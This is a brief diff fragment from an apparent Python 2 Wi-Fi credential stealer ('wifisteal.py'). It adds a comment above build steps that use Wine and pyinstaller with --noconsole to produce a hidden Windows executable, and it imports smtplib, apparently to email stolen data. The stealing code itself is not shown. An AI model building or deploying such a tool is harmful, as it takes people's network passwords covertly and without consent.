@@ -6,6 +6,7 @@ import subprocess
 import smtplib 
 import re   //regex python
 
+#To install the dependences 
 #wine/root/.wine/drive_c/python27/python.exe -m pip install smtplib
 #wine/root/.wine/drive_c/python27/python.exe -m pip install re
 #wine/root/.wine/drive_c/python27/Scripts/pyinstaller.exe --onefile --noconsole wifisteal.py
